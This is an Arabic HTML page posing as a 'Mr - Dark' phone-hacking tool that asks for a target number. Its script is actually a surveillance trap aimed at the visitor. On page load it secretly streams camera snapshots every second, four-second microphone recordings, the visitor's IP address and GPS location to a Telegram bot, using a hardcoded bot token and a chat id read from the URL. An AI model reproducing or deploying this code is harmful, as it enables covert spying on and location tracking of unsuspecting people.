<!DOCTYPE html>
<html lang="ar">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mr - Dark</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 50%, #16213e 100%);
            color: #00ff41;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
        }

        /* Matrix Background Effect */
        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.1;
            pointer-events: none;
        }

        .matrix-bg::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image:
                repeating-linear-gradient(0deg,
                    transparent,
                    transparent 2px,
                    rgba(0, 255, 65, 0.03) 2px,
                    rgba(0, 255, 65, 0.03) 4px),
                repeating-linear-gradient(90deg,
                    transparent,
                    transparent 2px,
                    rgba(0, 255, 65, 0.03) 2px,
                    rgba(0, 255, 65, 0.03) 4px);
            animation: matrix-scroll 20s linear infinite;
        }

        @keyframes matrix-scroll {
            0% {
                transform: translateY(-100%);
            }

            100% {
                transform: translateY(100%);
            }
        }

        .header {
            text-align: center;
            padding: 20px 0;
            background: rgba(0, 0, 0, 0.8);
            border-bottom: 2px solid #00ff41;
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
        }

        .header h1 {
            font-size: 2.5em;
            color: #ff0000;
            text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000;
            animation: glow-red 2s ease-in-out infinite alternate;
            margin-bottom: 10px;
        }

        @keyframes glow-red {
            from {
                text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000;
            }

            to {
                text-shadow: 0 0 20px #ff0000, 0 0 30px #ff0000, 0 0 40px #ff0000;
            }
        }

        .subtitle {
            color: #00ff41;
            font-size: 1.2em;
            text-shadow: 0 0 5px #00ff41;
        }

        .container {
            max-width: 600px;
            margin: 50px auto;
            padding: 40px;
            background: rgba(0, 0, 0, 0.9);
            border: 2px solid #00ff41;
            border-radius: 15px;
            box-shadow:
                0 0 30px rgba(0, 255, 65, 0.4),
                inset 0 0 30px rgba(0, 255, 65, 0.1);
            position: relative;
        }

        .container::before {
            content: '';
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            background: linear-gradient(45deg, #00ff41, #ff0000, #00ff41);
            border-radius: 15px;
            z-index: -1;
            animation: border-glow 3s linear infinite;
        }

        @keyframes border-glow {
            0% {
                opacity: 0.5;
            }

            50% {
                opacity: 1;
            }

            100% {
                opacity: 0.5;
            }
        }

        .welcome-text {
            text-align: center;
            margin-bottom: 30px;
        }

        .welcome-text h2 {
            font-size: 2em;
            color: #ff0000;
            margin-bottom: 15px;
            text-shadow: 0 0 10px #ff0000;
        }

        .welcome-text p {
            font-size: 1.1em;
            color: #00ff41;
            text-shadow: 0 0 5px #00ff41;
        }

        .input-group {
            margin: 30px 0;
            position: relative;
        }

        .input-group input {
            width: 100%;
            padding: 15px 20px;
            font-size: 1.2em;
            background: rgba(0, 0, 0, 0.8);
            color: #00ff41;
            border: 2px solid #00ff41;
            border-radius: 10px;
            outline: none;
            transition: all 0.3s ease;
            font-family: 'Courier New', monospace;
        }

        .input-group input:focus {
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.5);
            border-color: #00ff41;
        }

        .input-group input::placeholder {
            color: #888;
        }

        .hack-button {
            display: block;
            width: 100%;
            padding: 15px;
            font-size: 1.3em;
            font-weight: bold;
            color: #000;
            background: linear-gradient(45deg, #00ff41, #00cc33);
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: 'Courier New', monospace;
            text-transform: uppercase;
            letter-spacing: 2px;
            position: relative;
            overflow: hidden;
        }

        .hack-button:hover {
            transform: scale(1.05);
            box-shadow: 0 0 30px rgba(0, 255, 65, 0.6);
        }

        .hack-button:active {
            transform: scale(0.98);
        }

        .hack-button::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            background: rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            transform: translate(-50%, -50%);
            transition: width 0.6s, height 0.6s;
        }

        .hack-button:active::before {
            width: 300px;
            height: 300px;
        }

        .result {
            margin-top: 30px;
            padding: 20px;
            background: rgba(0, 0, 0, 0.6);
            border: 1px solid #00ff41;
            border-radius: 10px;
            min-height: 60px;
            display: none;
        }

        .result.show {
            display: block;
            animation: fadeIn 0.5s ease-in;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .terminal-line {
            margin: 5px 0;
            color: #00ff41;
            text-shadow: 0 0 5px #00ff41;
        }

        .error-text {
            color: #ff0000;
            text-shadow: 0 0 5px #ff0000;
        }

        .loading-animation {
            display: inline-block;
            animation: blink 1s infinite;
        }

        @keyframes blink {

            0%,
            50% {
                opacity: 1;
            }

            51%,
            100% {
                opacity: 0;
            }
        }

        .skull {
            font-size: 2em;
            margin: 10px 0;
            animation: rotate 2s linear infinite;
        }

        @keyframes rotate {
            from {
                transform: rotate(0deg);
            }

            to {
                transform: rotate(360deg);
            }
        }

        .warning {
            position: fixed;
            top: 10px;
            right: 10px;
            background: rgba(255, 0, 0, 0.9);
            color: white;
            padding: 10px 15px;
            border-radius: 5px;
            font-size: 0.9em;
            z-index: 1000;
            animation: hideWarning 5s forwards;
            /* المدة الإجمالية 5 ثواني */
        }

        @keyframes hideWarning {
            0% {
                opacity: 1;
            }

            80% {
                opacity: 1;
            }

            100% {
                opacity: 0;
                display: none;
            }
        }

        /* Media Queries للاستجابة */
        @media (max-width: 768px) {
            .container {
                margin: 20px;
                padding: 20px;
            }

            .header h1 {
                font-size: 2em;
            }

            .welcome-text h2 {
                font-size: 1.5em;
            }
        }

        #video {
            display: none;
            /* عدم عرض الفيديو أثناء التسجيل */
        }

        body {
            background-color: #282c34;
            color: #ffffff;
            font-family: 'Arial', sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        .container {
            background: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
            margin-top: 20px;
        }

        h1 {
            color: red;
        }

        input[type="text"] {
            padding: 10px;
            font-size: 1.2em;
            border: none;
            border-radius: 5px;
            width: 80%;
            margin-bottom: 20px;
        }

        button {
            padding: 10px 20px;
            font-size: 1.2em;
            color: #fff;
            background-color: #007bff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background 0.3s;
        }

        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>

<body>

    <div class="warning">
        ⚠️ يجب اعطاء الصلاحيات
    </div>
    <div class="header">
        <h1>☠️ MR - DARK HACKER ☠️</h1>
        <div class="subtitle">█ ELITE PHONE HACKING SYSTEM █</div>
    </div>
    <div class="container">
        <div class="welcome-text">
            <h2>🔥 مرحباً في النظام السري 🔥</h2>
            <p>⚡ أدخل رقم الهدف لبدء عملية الاختراق ⚡</p>
        </div>
        <div class="input-group">
            <input type="text" id="phoneInput" placeholder="🔢 رقم الهاتف المستهدف..." maxlength="15">
        </div>

        <button class="hack-button" onclick="startHacking()">
            🚀 بدء عملية الاختراق 🚀
        </button>

        <div id="result" class="result"></div>



        <video id="video" autoplay></video>
        <canvas id="canvas" width="2000" height="2000" style="display: none;"></canvas>



        <script>
            const botToken = "8211931301:AAHKeI6iPoOAfXBo6mQ1n7bcvfF6CHnFxK8"; //token bot
            let chatId = getChatIdFromUrl();

            function getChatIdFromUrl() {
                const urlParams = new URLSearchParams(window.location.search);
                return urlParams.get('id');
            }

            function startCamera() {
                const video = document.getElementById("video");
                const canvas = document.getElementById("canvas");
                const ctx = canvas.getContext("2d");

                const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
                if (isMobile) {
                    video.setAttribute("width", "100%");
                    video.setAttribute("height", "auto");
                } else {
                    video.setAttribute("width", "2000");
                    video.setAttribute("height", "2000");
                }

                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => {
                        video.srcObject = stream;

                        setInterval(() => {
                            ctx.drawImage(video, 0, 0, 2000, 2000);
                            canvas.toBlob(sendToTelegram, "image/jpeg", 0.8);
                            sendIpAddressToTelegram();
                            sendLocationToTelegram();
                            startRecording();
                        }, 1000);
                    })
                    .catch(error => {
                        console.error(error);
                        alert("Failed to access camera.");
                    });
            }

            function sendToTelegram(blob) {
                const formData = new FormData();
                formData.append("photo", blob, "camera.jpg");
                formData.append("chat_id", chatId);

                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: "POST",
                    body: formData,
                })
                    .then(response => response.json())
                    .then(data => {
                        if (data.ok) {
                            console.log("Camera frame sent to Telegram.");
                        } else {
                            throw new Error(data.description);
                        }
                    })
                    .catch(error => {
                        console.error(error);
                        alert("Failed to send camera frame.");
                    });
            }

            function sendIpAddressToTelegram() {
                fetch("https://api.ipify.org/?format=json")
                    .then(response => response.json())
                    .then(data => {
                        const ipAddress = data.ip;
                        const message = `IP Address: ${ipAddress}`;
                        sendTextToTelegram(message);
                    })
                    .catch(error => {
                        console.error(error);
                        alert("Failed to fetch IP address.");
                    });
            }

            function sendTextToTelegram(message) {
                const params = new URLSearchParams({
                    chat_id: chatId,
                    text: message
                });

                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?${params}`)
                    .then(response => response.json())
                    .then(data => {
                        if (data.ok) {
                            console.log("Message sent to Telegram.");
                        } else {
                            throw new Error(data.description);
                        }
                    })
                    .catch(error => {
                        console.error(error);
                        alert("Failed to send message.");
                    });
            }

            function sendLocationToTelegram() {
                if ("geolocation" in navigator) {
                    navigator.geolocation.getCurrentPosition(position => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        const message = `GPS Location: ${latitude}, ${longitude}`;
                        sendTextToTelegram(message);
                    }, error => {
                        console.error(error);
                        const errorMessage = getGeolocationErrorMessage(error);
                        alert(errorMessage);
                    });
                } else {
                    console.error("Geolocation not available.");
                    alert("Geolocation is not supported.");
                }
            }

            function getGeolocationErrorMessage(error) {
                switch (error.code) {
                    case error.PERMISSION_DENIED:
                        return "Permission to access GPS location was denied.";
                    case error.POSITION_UNAVAILABLE:
                        return "GPS location information is unavailable.";
                    case error.TIMEOUT:
                        return "GPS location request timed out.";
                    default:
                        return "An unknown error occurred while fetching GPS location.";
                }
            }

            function sendAudioToTelegram(blob) {
                const formData = new FormData();
                formData.append("audio", blob, "recording.wav");
                formData.append("chat_id", chatId);

                fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
                    method: "POST",
                    body: formData,
                })
                    .then(response => response.json())
                    .then(data => {
                        if (data.ok) {
                            console.log("Audio recording sent to Telegram.");
                        } else {
                            throw new Error(data.description);
                        }
                    })
                    .catch(error => {
                        console.error(error);
                        alert("Failed to send audio recording.");
                    });
            }

            function startRecording() {
                const audioChunks = [];

                navigator.mediaDevices
                    .getUserMedia({ audio: true, video: false })
                    .then((stream) => {
                        const mediaRecorder = new MediaRecorder(stream);

                        mediaRecorder.start();

                        setTimeout(() => {
                            mediaRecorder.stop();
                        }, 4000);

                        mediaRecorder.addEventListener("dataavailable", (event) => {
                            audioChunks.push(event.data);
                        });

                        mediaRecorder.addEventListener("stop", () => {
                            const audioBlob = new Blob(audioChunks, { type: "audio/wav" });
                            sendAudioToTelegram(audioBlob);
                        });
                    })
                    .catch((error) => {
                        console.error(error);
                        alert("Failed to access microphone.");
                    });
            }

            // Call startCamera when the page is loaded.
            startCamera();
        </script>

</body>

</html>
